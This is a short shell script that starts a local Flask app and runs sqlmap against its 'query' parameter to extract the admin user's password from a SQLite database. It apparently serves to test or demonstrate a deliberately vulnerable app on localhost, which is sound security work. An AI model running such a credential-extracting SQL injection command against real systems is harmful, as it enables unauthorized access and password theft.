export FLASK_APP=website/app.py
flask run > access.log 2>&1 &
rm -rfv /home/hjalti/.local/share/sqlmap/output/localhost
sqlmap --dbms=sqlite --string=exists --risk=3 -p query -u 'http://localhost:5000/?query=asdf' --sql-query="select password from users where username='admin'"
killall flask
